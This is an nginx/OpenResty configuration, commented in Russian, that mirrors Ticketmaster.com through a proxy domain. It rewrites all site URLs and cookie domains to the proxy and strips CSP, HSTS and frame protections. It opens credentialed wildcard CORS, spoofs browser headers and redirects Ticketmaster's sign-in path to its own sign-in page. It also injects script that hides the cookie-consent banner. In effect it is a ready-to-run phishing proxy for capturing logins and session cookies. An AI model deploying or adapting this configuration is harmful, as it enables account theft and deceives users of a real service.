worker_processes auto;
error_log /var/log/nginx/error.log warn;
pid /tmp/nginx.pid;

env PROXY_BASE_URL;
env UPSTREAM_PROXY;

events {
    worker_connections 1024;
}

http {
    include       /usr/local/openresty/nginx/conf/mime.types;
    default_type  application/octet-stream;

    log_format main '$remote_addr - $remote_user [$time_local] '
                    '"$request" $status $body_bytes_sent '
                    '"$http_referer" "$http_user_agent"';

    access_log /var/log/nginx/access.log main;

    sendfile        on;
    tcp_nopush      on;
    tcp_nodelay     on;
    keepalive_timeout 65;
    gzip off;
    gunzip on;
    server_tokens off;

    # Не передаём proxy-заголовки upstream'у
    proxy_set_header X-Real-IP        "";
    proxy_set_header X-Forwarded-For  "";
    proxy_set_header X-Forwarded-Proto "";
    proxy_set_header X-Forwarded-Host "";
    proxy_set_header Via              "";

    # DNS resolver (Google + Cloudflare)
    resolver 8.8.8.8 1.1.1.1 valid=300s ipv6=off;
    resolver_timeout 5s;

    # Кеш для проксированного контента
    proxy_cache_path /var/cache/nginx/tm levels=1:2
                     keys_zone=tm_cache:64m
                     max_size=2g
                     inactive=30m
                     use_temp_path=off;

    # Лимит размера тела запроса
    client_max_body_size 50m;

    # Буферы
    proxy_buffer_size       128k;
    proxy_buffers           4 256k;
    proxy_busy_buffers_size 256k;

    lua_shared_dict cookies 10m;
    lua_shared_dict traffic 5m;
    lua_package_path "/etc/nginx/lua/?.lua;;";

    # ─── Upstream target ─────────────────────────────────────────
    upstream ticketmaster {
        server www.ticketmaster.com:443;
        keepalive 16;
    }

    server {
        listen 80;
        server_name _;

        # Переменные для подстановки
        set $target_host   "www.ticketmaster.com";
        set $target_scheme "https";
        set $proxy_domain  $host;

        # Берём URL прокси из ENV
        set_by_lua_block $proxy_url {
            return os.getenv("PROXY_BASE_URL") or "http://localhost:9090"
        }
        set_by_lua_block $proxy_url_host {
            local url = os.getenv("PROXY_BASE_URL") or "http://localhost:9090"
            return url:gsub("^https?://", "")
        }

        # ─── Health check ─────────────────────────────────────────
        location = /health {
            access_log off;
            default_type application/json;
            return 200 '{"status":"ok","proxy":"ticketmaster"}';
        }

        # ─── Traffic metrics API ────────────────────────────────
        location = /metrics/traffic {
            default_type application/json;
            content_by_lua_block {
                local metrics = require("metrics")
                ngx.say(metrics.to_json())
            }
        }

        location = /metrics/recent {
            default_type application/json;
            content_by_lua_block {
                local metrics = require("metrics")
                ngx.say(metrics.recent_json())
            }
        }

        # ─── Auth: перехватываем identity/sign-in → наш SPA ───────
        location /_sub/identity/sign-in {
            set_by_lua_block $proxy_url {
                return os.getenv("PROXY_BASE_URL") or "http://localhost:9090"
            }
            return 301 $proxy_url/sign-in$is_args$args;
        }

        # ─── Основной location ────────────────────────────────────
        location / {
            proxy_pass https://$target_host;

            # SSL к upstream
            proxy_ssl_server_name on;
            proxy_ssl_name        $target_host;
            proxy_ssl_protocols   TLSv1.2 TLSv1.3;

            # Заголовки к upstream — притворяемся обычным браузером
            proxy_set_header Host              $target_host;
            proxy_set_header Accept-Encoding   "identity";
            proxy_set_header Referer           "https://$target_host$request_uri";
            proxy_set_header Origin            "https://$target_host";
            proxy_set_header User-Agent        $http_user_agent;
            proxy_set_header Accept-Language   $http_accept_language;
            proxy_set_header Accept            $http_accept;
            proxy_set_header Connection        "keep-alive";

            # ─── Перезапись контента ──────────────────────────────
            sub_filter_once off;
            sub_filter_types text/css text/javascript application/javascript application/json;

            sub_filter 'https://www.ticketmaster.com'  '$proxy_url';
            sub_filter 'http://www.ticketmaster.com'   '$proxy_url';
            sub_filter '//www.ticketmaster.com'         '//$proxy_url_host';
            sub_filter 'www.ticketmaster.com'           '$proxy_url_host';

            # Кеширование
            proxy_cache tm_cache;
            proxy_cache_valid 200 10m;
            proxy_cache_valid 301 302 1m;
            proxy_cache_valid any 30s;
            proxy_cache_use_stale error timeout updating;

            # ─── Переписываем Location при редиректах ─────────────
            proxy_redirect https://$target_host/ $proxy_url/;
            proxy_redirect http://$target_host/  $proxy_url/;

            # Cookie domain rewrite
            proxy_cookie_domain $target_host $proxy_domain;
            proxy_cookie_domain ~\.ticketmaster\.com $proxy_domain;
            proxy_cookie_domain ~\.ticketm\.net $proxy_domain;

            # ─── Lua: убираем CORS, CSP, правим заголовки + куки ─
            header_filter_by_lua_block {
                -- Убиваем restrictive заголовки от upstream
                ngx.header["Content-Security-Policy"] = nil
                ngx.header["Content-Security-Policy-Report-Only"] = nil
                ngx.header["X-Frame-Options"] = nil
                ngx.header["X-Content-Type-Options"] = nil
                ngx.header["Strict-Transport-Security"] = nil
                ngx.header["Referrer-Policy"] = nil
                ngx.header["Permissions-Policy"] = nil

                -- Ставим permissive CORS
                ngx.header["Access-Control-Allow-Origin"] = "*"
                ngx.header["Access-Control-Allow-Methods"] = "GET, POST, PUT, DELETE, OPTIONS, PATCH"
                ngx.header["Access-Control-Allow-Headers"] = "DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range,Authorization,Accept,Origin,Referer"
                ngx.header["Access-Control-Allow-Credentials"] = "true"
                ngx.header["Access-Control-Max-Age"] = "86400"
                ngx.header["Access-Control-Expose-Headers"] = "*"

                -- Скрываем сервер и TM-специфичные заголовки
                ngx.header["Server"] = "nginx"
                ngx.header["Via"] = nil
                ngx.header["X-Served-By"] = nil
                ngx.header["X-Cache"] = nil
                ngx.header["X-Cache-Hits"] = nil
                ngx.header["X-Timer"] = nil
                ngx.header["tm-bl"] = nil

                -- Перезаписываем Set-Cookie
                require("cookies").fix_cookies()
            }

            # ─── OPTIONS preflight ────────────────────────────────
            if ($request_method = 'OPTIONS') {
                add_header 'Access-Control-Allow-Origin'  '*' always;
                add_header 'Access-Control-Allow-Methods' 'GET, POST, PUT, DELETE, OPTIONS, PATCH' always;
                add_header 'Access-Control-Allow-Headers' 'DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range,Authorization,Accept,Origin,Referer' always;
                add_header 'Access-Control-Max-Age'       86400;
                add_header 'Content-Type'                 'text/plain charset=UTF-8';
                add_header 'Content-Length'                0;
                return 204;
            }

            # ─── Lua body filter: https→http downgrade + поддомены ─
            body_filter_by_lua_block {
                local chunk = ngx.arg[1]
                local eof   = ngx.arg[2]
                local ct = ngx.header["Content-Type"] or ""

                -- Только текстовый контент
                if ct:find("text/html", 1, true)
                    or ct:find("javascript", 1, true)
                    or ct:find("text/css", 1, true)
                    or ct:find("application/json", 1, true)
                    or ct:find("text/xml", 1, true)
                then
                    local buf = ngx.ctx.buf
                    if not buf then buf = {} end
                    if chunk and chunk ~= "" then
                        buf[#buf + 1] = chunk
                        ngx.arg[1] = nil
                    end
                    if eof then
                        local body = table.concat(buf)
                        local rewrite = require("rewrite")
                        body = rewrite.rewrite(body)

                        -- JS-инъекция: удаляем cookie-баннер OneTrust
                        if ct:find("text/html", 1, true) then
                            local inject = '<style>#onetrust-banner-sdk,#onetrust-consent-sdk,#onetrust-pc-sdk,.onetrust-pc-dark-filter{display:none!important;visibility:hidden!important;height:0!important;width:0!important;overflow:hidden!important;position:absolute!important;pointer-events:none!important}</style><script>(function(){var s=new MutationObserver(function(m){m.forEach(function(r){r.addedNodes.forEach(function(n){if(n.id==="onetrust-banner-sdk"||n.id==="onetrust-consent-sdk"){n.remove()}})})});s.observe(document.documentElement,{childList:true,subtree:true});window.addEventListener("DOMContentLoaded",function(){["onetrust-banner-sdk","onetrust-consent-sdk"].forEach(function(id){var e=document.getElementById(id);if(e)e.remove()})})})();</script>'
                            body = body:gsub("</body>", inject .. "</body>")
                        end

                        ngx.arg[1] = body
                    else
                        ngx.ctx.buf = buf
                    end
                end
            }

            log_by_lua_block {
                require("metrics").record()
            }
        }

        # ─── Статические ресурсы (агрессивный кеш) ────────────────
        location ~* \.(jpg|jpeg|png|gif|ico|svg|webp|woff2?|ttf|eot|css|js)$ {
            proxy_pass https://$target_host;

            proxy_ssl_server_name on;
            proxy_ssl_name        $target_host;
            proxy_ssl_protocols   TLSv1.2 TLSv1.3;

            proxy_set_header Host            $target_host;
            proxy_set_header Accept-Encoding "identity";
            proxy_set_header Referer         "https://$target_host$request_uri";
            proxy_set_header Origin          "https://$target_host";
            proxy_set_header User-Agent      $http_user_agent;
            proxy_set_header Accept-Language $http_accept_language;

            sub_filter_once off;
            sub_filter_types text/css text/javascript application/javascript;
            sub_filter 'https://www.ticketmaster.com' '$proxy_url';
            sub_filter 'http://www.ticketmaster.com'  '$proxy_url';
            sub_filter '//www.ticketmaster.com'        '//$proxy_url_host';
            sub_filter 'www.ticketmaster.com'          '$proxy_url_host';

            proxy_cache tm_cache;
            proxy_cache_valid 200 1h;
            proxy_cache_valid any 5m;

            proxy_redirect https://$target_host/ $proxy_url/;

            header_filter_by_lua_block {
                ngx.header["Content-Security-Policy"] = nil
                ngx.header["X-Frame-Options"] = nil
                ngx.header["Access-Control-Allow-Origin"] = "*"
                ngx.header["Server"] = "nginx"
                require("cookies").fix_cookies()
            }

            expires 1h;

            log_by_lua_block {
                require("metrics").record()
            }
        }

        # ─── Проксирование поддоменов TM: /_sub/{name}/ ──────────
        location ~ ^/_sub/(?<tm_sub>[^/]+)(?<tm_path>/.*)$ {
            set_by_lua_block $subdomain_host {
                local map = {
                    identity      = "identity.ticketmaster.com",
                    consent       = "consent.ticketmaster.com",
                    maps          = "maps.ticketmaster.com",
                    media         = "media.ticketmaster.com",
                    static        = "static.ticketmaster.com",
                    app           = "app.ticketmaster.com",
                    ["s1-ticketm"]= "s1.ticketm.net",
                    cookielaw     = "cdn.cookielaw.org",
                }
                local sub = ngx.var.tm_sub
                return map[sub] or (sub .. ".ticketmaster.com")
            }

            proxy_pass https://$subdomain_host$tm_path$is_args$args;

            proxy_ssl_server_name on;
            proxy_ssl_name        $subdomain_host;
            proxy_ssl_protocols   TLSv1.2 TLSv1.3;

            proxy_set_header Host            $subdomain_host;
            proxy_set_header Accept-Encoding "identity";
            proxy_set_header Referer         "https://www.ticketmaster.com/";
            proxy_set_header Origin          "https://$subdomain_host";
            proxy_set_header User-Agent      $http_user_agent;
            proxy_set_header Accept-Language $http_accept_language;

            # Cookie domain rewrite
            proxy_cookie_domain ~\.ticketmaster\.com $proxy_domain;
            proxy_cookie_domain ~\.ticketm\.net $proxy_domain;
            proxy_cookie_domain ~\.cookielaw\.org $proxy_domain;

            proxy_cache tm_cache;
            proxy_cache_valid 200 10m;
            proxy_cache_valid any 1m;

            header_filter_by_lua_block {
                ngx.header["Content-Security-Policy"] = nil
                ngx.header["Content-Security-Policy-Report-Only"] = nil
                ngx.header["X-Frame-Options"] = nil
                ngx.header["Strict-Transport-Security"] = nil
                ngx.header["Access-Control-Allow-Origin"] = "*"
                ngx.header["Access-Control-Allow-Methods"] = "GET, POST, PUT, DELETE, OPTIONS, PATCH"
                ngx.header["Access-Control-Allow-Headers"] = "*"
                ngx.header["Access-Control-Allow-Credentials"] = "true"
                ngx.header["Server"] = "nginx"
                require("cookies").fix_cookies()
            }

            body_filter_by_lua_block {
                local chunk = ngx.arg[1]
                local eof   = ngx.arg[2]
                local ct = ngx.header["Content-Type"] or ""
                if ct:find("text/", 1, true) or ct:find("javascript", 1, true) or ct:find("json", 1, true) then
                    local buf = ngx.ctx.buf
                    if not buf then buf = {} end
                    if chunk and chunk ~= "" then
                        buf[#buf + 1] = chunk
                        ngx.arg[1] = nil
                    end
                    if eof then
                        local body = table.concat(buf)
                        local rewrite = require("rewrite")
                        ngx.arg[1] = rewrite.rewrite(body)
                    else
                        ngx.ctx.buf = buf
                    end
                end
            }

            # OPTIONS
            if ($request_method = 'OPTIONS') {
                add_header 'Access-Control-Allow-Origin'  '*' always;
                add_header 'Access-Control-Allow-Methods' 'GET, POST, PUT, DELETE, OPTIONS, PATCH' always;
                add_header 'Access-Control-Allow-Headers' '*' always;
                add_header 'Access-Control-Max-Age'       86400;
                return 204;
            }

            log_by_lua_block {
                require("metrics").record()
            }
        }
    }
}
